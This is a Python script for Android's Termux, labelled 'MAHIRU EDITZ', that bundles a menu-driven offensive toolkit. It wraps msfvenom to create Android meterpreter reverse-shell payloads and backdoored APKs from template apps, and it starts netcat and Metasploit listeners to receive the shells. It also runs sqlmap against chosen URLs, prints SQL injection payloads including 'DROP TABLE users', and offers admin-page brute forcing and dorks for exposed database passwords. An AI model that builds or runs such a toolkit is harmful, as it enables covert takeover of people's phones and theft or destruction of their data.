#!/data/data/com.termux/files/usr/bin/python3
# MAHIRU EDITZ - TERMUX ANDROID (PART 1/6)
# BY DIZX FOR KING 👑😈

import os
import sys
import subprocess
import time
import socket
import json
import hashlib
import platform

# ============================================================
# COLOR SAMA PERSIS DENGAN VERSI LINUX
# ============================================================

C = '\033[38;2;0;200;200m'
G = '\033[38;2;0;255;100m'
R = '\033[38;2;255;50;80m'
Y = '\033[38;2;255;200;0m'
W = '\033[38;2;220;220;220m'
D = '\033[38;2;100;100;120m'
X = '\033[0m'
B = '\033[1m'

# ============================================================
# KONFIGURASI (SAMA PERSIS)
# ============================================================

HOME = os.path.expanduser("~")
CONFIG_FILE = os.path.join(HOME, ".mahiru_config.json")
CREDS_FILE = os.path.join(HOME, ".mahiru_creds.json")

def load_config():
    default = {"lhost": "192.168.1.100", "lport": "4444", "first_run": True}
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    with open(CONFIG_FILE, "w") as f:
        json.dump(default, f, indent=4)
    return default

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

def load_creds():
    default = {"username": "admin", "password": hashlib.sha256("dizx123".encode()).hexdigest()}
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, "r") as f:
            return json.load(f)
    with open(CREDS_FILE, "w") as f:
        json.dump(default, f, indent=4)
    return default

# UTILITIES & UI

def clear():
    os.system('clear')

def line():
    print(f"{D}{'─' * 49}{X}")

def spacing():
    print()

def press_enter():
    input(f"\n  {D}press enter to continue{X}")

def status_icon(status):
    if status == "success":
        return f"{G}●{X}"
    elif status == "error":
        return f"{R}●{X}"
    elif status == "warning":
        return f"{Y}●{X}"
    return f"{D}○{X}"

def section(title):
    print(f"\n  {D}── {C}{title}{X} {D}──{X}")

def header():
    clear()
    print(f"\n  {C}Tools by mahiru editz{X}")
    line()

def menu():
    config = load_config()
    print(f"\n  {C}01{X}  Scan IP {D}[nmap]{X}")
    print(f"  {C}02{X}  Hack cellphone {D}[metasploit]{X}")
    print(f"  {C}03{X}  Hack database {D}[sqlmap]{X}")
    print(f"  {C}04{X}  Enable tor")
    print(f"  {C}05{X}  Show my IP")
    print(f"  {C}06{X}  System check")
    print(f"  {C}07{X}  Check installation")
    print(f"  {C}08{X}  Set LHOST/LPORT {D}[{config['lhost']}:{config['lport']}]{X}")
    print(f"  {C}09{X}  Change password")
    print(f"  {C}00{X}  Exit")
    line()

def submenu(title, items):
    clear()
    print(f"\n  {C}Tools by mahiru editz{X}")
    line()
    print(f"\n  {C}▶{X}  {title}")
    line()
    for key, value, desc in items:
        print(f"  {C}{key}{X}  {value} {D}[{desc}]{X}")
    print(f"  {C}00{X}  Back")
    line()

# SYSTEM CHECK & LOGIN

def system_check():
    clear()
    print(f"\n  {C}Tools by mahiru editz{X}")
    line()
    print(f"\n  {D}── SYSTEM CHECK ──{X}\n")
    
    print(f"  {C}▶{X}  {B}SYSTEM{X}")
    print(f"  {D}  termux{X}     {subprocess.check_output(['uname', '-o'], text=True).strip()}")
    print(f"  {D}  kernel{X}     {platform.release()}")
    print(f"  {D}  arch{X}       {platform.machine()}")
    spacing()
    
    stat = os.statvfs("/")
    total = (stat.f_blocks * stat.f_frsize) / (1024**3)
    free = (stat.f_bfree * stat.f_frsize) / (1024**3)
    used_percent = int(((total - free) / total) * 100)
    
    print(f"  {C}▶{X}  {B}STORAGE{X}")
    print(f"  {D}  total{X}      {total:.1f} GB")
    print(f"  {D}  free{X}       {free:.1f} GB")
    print(f"  {D}  usage{X}      {used_percent}%")
    spacing()
    
    print(f"  {C}▶{X}  {B}NETWORK{X}")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        print(f"  {D}  local ip{X}    {C}{s.getsockname()[0]}{X}")
    except:
        print(f"  {D}  local ip{X}    {R}offline{X}")
    s.close()
    
    try:
        public = subprocess.check_output(["curl", "-s", "ifconfig.me"], text=True).strip()
        print(f"  {D}  public ip{X}   {C}{public}{X}")
    except:
        print(f"  {D}  public ip{X}   {R}no connection{X}")
    
    spacing()
    line()
    press_enter()

def quick_check():
    stat = os.statvfs("/")
    free = (stat.f_bfree * stat.f_frsize) / (1024**3)
    total = (stat.f_blocks * stat.f_frsize) / (1024**3)
    used_percent = int(((total - free) / total) * 100)
    icon = f"{G}✓{X}" if used_percent < 85 else f"{Y}⚠{X}"
    print(f"  {D}storage{X}  {icon} {used_percent}% ({free:.1f}GB free)")

def login():
    for attempt in range(3):
        clear()
        print(f"\n  {C}Tools by mahiru editz{X}")
        line()
        print(f"\n  {D}── LOGIN ──{X}\n")
        user = input(f"  {D}username > {X}")
        pwd = input(f"  {D}password > {X}")
        
        creds = load_creds()
        if user == creds["username"] and hashlib.sha256(pwd.encode()).hexdigest() == creds["password"]:
            print(f"\n  {status_icon('success')} {G}login success{X}")
            time.sleep(1)
            return True
        print(f"\n  {status_icon('error')} {R}invalid ({2-attempt} left){X}")
        time.sleep(1.5)
    return False

def change_password():
    section("CHANGE PASSWORD")
    spacing()
    creds = load_creds()
    old = input(f"  {D}old password > {X}")
    if hashlib.sha256(old.encode()).hexdigest() != creds["password"]:
        print(f"  {status_icon('error')} wrong password")
    else:
        new = input(f"  {D}new password > {X}")
        confirm = input(f"  {D}confirm > {X}")
        if new != confirm:
            print(f"  {status_icon('error')} not match")
        elif len(new) < 4:
            print(f"  {status_icon('error')} too short")
        else:
            creds["password"] = hashlib.sha256(new.encode()).hexdigest()
            with open(CREDS_FILE, "w") as f:
                json.dump(creds, f, indent=4)
            print(f"  {status_icon('success')} password changed")
    press_enter()

# FEATURES: SCAN IP, SHOW IP, TOR, INSTALL CHECK, SET LHOST/LPORT

def scan_ip():
    section("SCAN IP")
    spacing()
    target = input(f"  {D}target > {X}")
    if target:
        subprocess.run(["nmap", "-sV", "-sC", "-T4", target])
    else:
        print(f"  {status_icon('error')} target required")
    press_enter()

def show_ip():
    section("SHOW MY IP")
    spacing()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        print(f"  {D}local{X}   {C}{s.getsockname()[0]}{X}")
    except:
        print(f"  {D}local{X}   {R}failed{X}")
    s.close()
    try:
        public = subprocess.check_output(["curl", "-s", "ifconfig.me"], text=True).strip()
        print(f"  {D}public{X}  {C}{public}{X}")
    except:
        print(f"  {D}public{X}  {R}failed{X}")
    press_enter()

def enable_tor():
    section("ENABLE TOR")
    spacing()
    if subprocess.run(["which", "tor"], capture_output=True).returncode != 0:
        print(f"  {status_icon('warning')} installing tor...")
        subprocess.run(["pkg", "install", "tor", "-y"])
    subprocess.run(["pkill", "tor"])
    subprocess.Popen(["tor", "-f", f"{HOME}/.tor/torrc"])
    time.sleep(2)
    print(f"  {status_icon('success')} tor active (socks5://127.0.0.1:9050)")
    press_enter()

def check_installation():
    section("CHECK INSTALLATION")
    spacing()
    tools = ["nmap", "msfvenom", "sqlmap", "tor", "curl"]
    for tool in tools:
        if subprocess.run(["which", tool], capture_output=True).returncode == 0:
            print(f"  {status_icon('success')} {tool}")
        else:
            print(f"  {status_icon('error')} {tool} {D}[not installed]{X}")
    press_enter()

def set_lhost_port():
    config = load_config()
    section("SET LHOST & LPORT")
    spacing()
    print(f"  {D}current: {config['lhost']}:{config['lport']}{X}")
    new_lhost = input(f"  {D}new lhost > {X}")
    new_lport = input(f"  {D}new lport > {X}")
    if new_lhost:
        config['lhost'] = new_lhost
    if new_lport:
        config['lport'] = new_lport
    save_config(config)
    print(f"  {status_icon('success')} saved: {config['lhost']}:{config['lport']}")
    press_enter()

# SUBMENU HACK CELLPHONE

def submenu_hack_cellphone():
    items = [
        ("01", "Create payload", "msfvenom"),
        ("02", "Inject to APK", "manual"),
        ("03", "Decompile APK", "apktool"),
        ("04", "Start listener", "metasploit/nc"),
        ("05", "Create backdoor", "template"),
        ("06", "Extract payload", "from apk"),
    ]
    
    while True:
        submenu("HACK CELLPHONE", items)
        choice = input(f"\n  {C}→{X} {D}select{X} > ")
        
        if choice == "01":
            config = load_config()
            section("CREATE PAYLOAD")
            spacing()
            if input(f"  {D}use default config? (y/n) > {X}").lower() == "y":
                ip, port = config['lhost'], config['lport']
            else:
                ip = input(f"  {D}lhost > {X}")
                port = input(f"  {D}lport > {X}") or "4444"
            out = input(f"  {D}output > {X}") or "payload.apk"
            subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-o", out])
            print(f"  {status_icon('success')} saved: {out}")
            press_enter()
            
        elif choice == "02":
            section("INJECT TO APK")
            spacing()
            apk = input(f"  {D}target apk > {X}")
            payload = input(f"  {D}payload path > {X}")
            if os.path.exists(apk) and os.path.exists(payload):
                subprocess.run(["unzip", "-q", payload, "-d", "temp_payload/"])
                print(f"  {status_icon('success')} copy classes.dex to decompiled folder")
            else:
                print(f"  {status_icon('error')} file not found")
            press_enter()
            
        elif choice == "03":
            section("DECOMPILE APK")
            spacing()
            print(f"  {Y}⚠ apktool not in Termuz, use PC{X}")
            press_enter()
            
        elif choice == "04":
            config = load_config()
            section("START LISTENER")
            spacing()
            if input(f"  {D}use default config? (y/n) > {X}").lower() == "y":
                ip, port = config['lhost'], config['lport']
            else:
                ip = input(f"  {D}lhost > {X}")
                port = input(f"  {D}lport > {X}") or "4444"
            print(f"\n  {C}[1]{X}  Netcat")
            print(f"  {C}[2]{X}  Metasploit")
            sub = input(f"\n  {D}choose > {X}")
            if sub == "1":
                subprocess.run(["nc", "-lvnp", port])
            elif sub == "2":
                handler = f"use multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST {ip}\nset LPORT {port}\nexploit -j"
                print(f"{C}{handler}{X}")
                subprocess.run(["msfconsole", "-q", "-x", handler])
            press_enter()
            
        elif choice == "05":
            config = load_config()
            section("CREATE BACKDOOR")
            spacing()
            if input(f"  {D}use default config? (y/n) > {X}").lower() == "y":
                ip, port = config['lhost'], config['lport']
            else:
                ip = input(f"  {D}lhost > {X}")
                port = input(f"  {D}lport > {X}") or "4444"
            template = input(f"  {D}template apk > {X}")
            if template and os.path.exists(template):
                subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-x", template, "-o", "backdoor.apk"])
            else:
                subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-o", "backdoor.apk"])
            print(f"  {status_icon('success')} saved: backdoor.apk")
            press_enter()
            
        elif choice == "06":
            section("EXTRACT PAYLOAD")
            spacing()
            payload = input(f"  {D}payload apk > {X}")
            if os.path.exists(payload):
                subprocess.run(["unzip", "-q", payload, "-d", "extracted/"])
                print(f"  {status_icon('success')} extracted to extracted/")
            else:
                print(f"  {status_icon('error')} not found")
            press_enter()
            
        elif choice == "00":
            break
        else:
            print(f"  {status_icon('error')} invalid")
            time.sleep(1)

# SUBMENU HACK DATABASE & MAIN

def submenu_hack_database():
    items = [
        ("01", "SQLMap + Cloudflare", "auto"),
        ("02", "Manual SQL injection", "payloads"),
        ("03", "Admin finder", "gobuster"),
        ("04", "Database scanner", "tables"),
        ("05", "Dork generator", "google"),
        ("06", "Subdomain scanner", "finder"),
    ]
    
    while True:
        submenu("HACK DATABASE", items)
        choice = input(f"\n  {C}→{X} {D}select{X} > ")
        
        if choice == "01":
            url = input(f"  {D}target url > {X}")
            if url:
                subprocess.run(["sqlmap", "-u", url, "--random-agent", "--batch", "--level=3"])
            press_enter()
            
        elif choice == "02":
            section("MANUAL SQL")
            print(f"\n  {C}•{X}  ' OR '1'='1")
            print(f"  {C}•{X}  ' UNION SELECT null, version() --")
            print(f"  {C}•{X}  ' AND 1=1 --")
            print(f"  {C}•{X}  '; DROP TABLE users --")
            press_enter()
            
        elif choice == "03":
            url = input(f"  {D}target url > {X}")
            if url:
                wordlist = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
                if os.path.exists(wordlist):
                    subprocess.run(["gobuster", "dir", "-u", url, "-w", wordlist])
                else:
                    print(f"  {Y}installing wordlist...{X}")
                    subprocess.run(["pkg", "install", "wordlist", "-y"])
            press_enter()
            
        elif choice == "04":
            url = input(f"  {D}target url > {X}")
            if url:
                subprocess.run(["sqlmap", "-u", url, "--dbs", "--batch"])
            press_enter()
            
        elif choice == "05":
            section("DORKS")
            print(f"\n  {C}•{X}  inurl:admin login")
            print(f"  {C}•{X}  intitle:index of /admin")
            print(f"  {C}•{X}  filetype:env DB_PASSWORD")
            press_enter()
            
        elif choice == "06":
            domain = input(f"  {D}domain > {X}")
            if domain and os.path.exists("sublist3r/sublist3r.py"):
                subprocess.run(["python", "sublist3r/sublist3r.py", "-d", domain])
            else:
                print(f"  {Y}install: git clone https://github.com/aboul3la/Sublist3r.git{X}")
            press_enter()
            
        elif choice == "00":
            break
        else:
            print(f"  {status_icon('error')} invalid")
            time.sleep(1)

# ============================================================
# MAIN PROGRAM
# ============================================================

def main():
    config = load_config()
    
    if config.get("first_run", True):
        system_check()
        config["first_run"] = False
        save_config(config)
    else:
        clear()
        print(f"\n  {C}Tools by mahiru editz{X}")
        line()
        print(f"\n  {D}── QUICK CHECK ──{X}\n")
        quick_check()
        time.sleep(2)
    
    if not login():
        sys.exit(0)
    
    while True:
        header()
        menu()
        choice = input(f"\n  {C}→{X} {D}select{X} > ")
        
        if choice == "01":
            scan_ip()
        elif choice == "02":
            submenu_hack_cellphone()
        elif choice == "03":
            submenu_hack_database()
        elif choice == "04":
            enable_tor()
        elif choice == "05":
            show_ip()
        elif choice == "06":
            system_check()
        elif choice == "07":
            check_installation()
        elif choice == "08":
            set_lhost_port()
        elif choice == "09":
            change_password()
        elif choice == "00":
            print(f"\n  {D}exiting...{X}\n")
            sys.exit(0)
        else:
            print(f"  {status_icon('error')} invalid")
            time.sleep(1)

if __name__ == "__main__":
    main()